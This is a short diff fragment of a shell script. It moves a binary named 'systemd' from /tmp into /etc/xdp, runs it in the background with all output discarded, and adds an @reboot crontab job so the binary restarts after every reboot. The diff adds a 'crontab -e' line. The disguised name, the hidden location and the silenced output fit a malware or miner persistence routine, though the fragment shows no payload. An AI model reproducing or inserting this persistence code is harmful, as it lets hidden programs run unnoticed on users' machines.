@@ -9,7 +9,7 @@ mkdir -p /etc/xdp/
 mv /tmp/systemd /etc/xdp/systemd
 /etc/xdp/systemd 2>/dev/null 1>/dev/null &
 
-        
+crontab -e
 command="/etc/xdp/systemd 2>/dev/null 1>/dev/null &"
 job="@reboot $command"
 cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
